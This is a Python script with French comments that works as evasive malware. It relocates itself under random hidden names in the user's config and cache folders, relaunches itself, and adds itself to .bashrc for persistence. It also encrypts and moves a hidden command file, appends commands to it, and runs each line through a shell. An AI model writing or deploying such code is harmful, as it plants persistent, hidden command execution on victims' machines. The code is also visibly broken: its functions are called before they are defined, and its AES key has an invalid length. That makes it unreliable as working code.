import os
import random
import time
import shutil
import subprocess
import hashlib
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from pathlib import Path

# --- CONFIGURATION ---
SLEEP_INTERVAL = 300  # Temps entre chaque mutation (en secondes)
MUTATION_DIRS = [Path.home() / '.config', Path.home() / '.local', Path.home() / '.cache']
MUTATION_PREFIX = ".script_"
CMD_PREFIX = ".cmd_"
CMD_TRACK_FILE = Path.home() / ".last_command_file"
ENCRYPTION_KEY = b"ma_clé_secrète_pour_cryptage"  # Remplacez ceci par une clé plus complexe et secrète

# --- DÉTECTION OS ---
OS = os.uname().sysname

# --- AUTO-MUTATION ---
random_dir = random.choice(MUTATION_DIRS)
random_dir.mkdir(parents=True, exist_ok=True)
random_name = f"{MUTATION_PREFIX}{int(time.time())}_{random.randint(0, 1000)}.py"
new_path = random_dir / random_name

# --- NETTOYAGE ANCIENNES COPIES ---
for dir in MUTATION_DIRS:
    for f in dir.glob(f"{MUTATION_PREFIX}*.py"):
        if f != Path(__file__):
            f.unlink()

# --- Mutation (copie et relance) ---
if __file__ != str(new_path):
    shutil.copy(__file__, new_path)
    os.chmod(new_path, 0o755)
    print(f"[*] Mutation : {new_path}")
    subprocess.Popen(["python3", str(new_path)])
    exit(0)

# --- FICHIER DE COMMANDES : recherche ou mutation ---
command_file = None
if CMD_TRACK_FILE.exists():
    with open(CMD_TRACK_FILE, "r") as f:
        command_file = f.read().strip()
else:
    # Première fois, créer et déplacer
    orig_cmd = Path.home() / "commandes.txt"
    if orig_cmd.exists():
        cmd_dir = random.choice(MUTATION_DIRS)
        cmd_dir.mkdir(parents=True, exist_ok=True)
        cmd_name = f"{CMD_PREFIX}{int(time.time())}_{random.randint(0, 1000)}.txt"
        command_file = cmd_dir / cmd_name

        # Ajouter les lignes spécifiques avant de crypter le fichier commandes.txt
        with open(orig_cmd, "a") as f:
            f.write("chmod +x execute.py\n")
            f.write("./execute.py\n")

        # Crypter le fichier commandes.txt avant de le déplacer
        encrypted_cmd_file = command_file.with_suffix(".enc")
        encrypt_file(orig_cmd, encrypted_cmd_file)
        orig_cmd.unlink()  # Supprimer l'original non crypté
        with open(CMD_TRACK_FILE, "w") as f:
            f.write(str(encrypted_cmd_file))
    else:
        print("Aucun fichier commande trouvé.")
        command_file = ""

# --- EXÉCUTION DES COMMANDES ---
if command_file and command_file.exists():
    print(f"[*] Fichier commande trouvé : {command_file}")
    decrypted_cmd_file = command_file.with_suffix(".dec")
    decrypt_file(command_file, decrypted_cmd_file)

    # Lire et exécuter les commandes après décryptage
    with open(decrypted_cmd_file, "r") as f:
        for line in f:
            print(f"[*] Exécution : {line.strip()}")
            subprocess.run(line.strip(), shell=True)

    # Nettoyage du fichier temporaire décrypté
    decrypted_cmd_file.unlink()
else:
    print("[-] Fichier de commandes introuvable ou supprimé.")

# --- PERSISTANCE AU DÉMARRAGE ---
if OS in ["Linux", "Darwin"]:
    bashrc = Path.home() / ".bashrc"
    if new_path not in bashrc.read_text():
        with open(bashrc, "a") as f:
            f.write(f"{new_path} &\n")
        print("[+] Persistance ajoutée à .bashrc")
elif OS in ["MINGW", "MSYS", "CYGWIN"]:
    # Pour Windows, persistance dans le registre
    pass  # Windows code (à ajouter si nécessaire)

# --- BOUCLE DE MUTATION & RELOCALISATION DU FICHIER COMMANDE ---
while True:
    time.sleep(SLEEP_INTERVAL)

    # Mutation script
    new_name = f"{MUTATION_PREFIX}{int(time.time())}_{random.randint(0, 1000)}.py"
    new_script = random_dir / new_name
    shutil.copy(__file__, new_script)
    os.chmod(new_script, 0o755)
    print(f"[*] Mutation cyclique : {new_script}")

    # Mutation du fichier commande s’il existe
    if command_file and command_file.exists():
        new_cmd_name = f"{CMD_PREFIX}{int(time.time())}_{random.randint(0, 1000)}.txt"
        new_cmd_dir = random.choice(MUTATION_DIRS)
        new_cmd_dir.mkdir(parents=True, exist_ok=True)
        new_cmd_path = new_cmd_dir / new_cmd_name

        # Crypter et déplacer le fichier commande
        encrypted_cmd_file = new_cmd_path.with_suffix(".enc")
        encrypt_file(command_file, encrypted_cmd_file)
        command_file.unlink()
        with open(CMD_TRACK_FILE, "w") as f:
            f.write(str(encrypted_cmd_file))
        print(f"[*] Fichier commande déplacé et crypté vers : {new_cmd_path}")

    subprocess.Popen(["python3", str(new_script)])
    exit(0)

# --- FONCTIONS DE CRYPTAGE/DÉCRYPTAGE ---
def encrypt_file(input_file, output_file):
    """Crypte un fichier avec AES-256-CBC"""
    with open(input_file, "rb") as f:
        data = f.read()
    
    # Générer un iv aléatoire
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(ENCRYPTION_KEY), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()

    # Ajouter un padding si nécessaire
    pad_length = 16 - len(data) % 16
    data += bytes([pad_length]) * pad_length

    # Crypter
    encrypted_data = encryptor.update(data) + encryptor.finalize()

    with open(output_file, "wb") as f:
        f.write(iv + encrypted_data)

def decrypt_file(input_file, output_file):
    """Décrypte un fichier avec AES-256-CBC"""
    with open(input_file, "rb") as f:
        data = f.read()

    iv = data[:16]
    encrypted_data = data[16:]

    cipher = Cipher(algorithms.AES(ENCRYPTION_KEY), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()

    decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()

    # Enlever le padding
    pad_length = decrypted_data[-1]
    decrypted_data = decrypted_data[:-pad_length]

    with open(output_file, "wb") as f:
        f.write(decrypted_data)
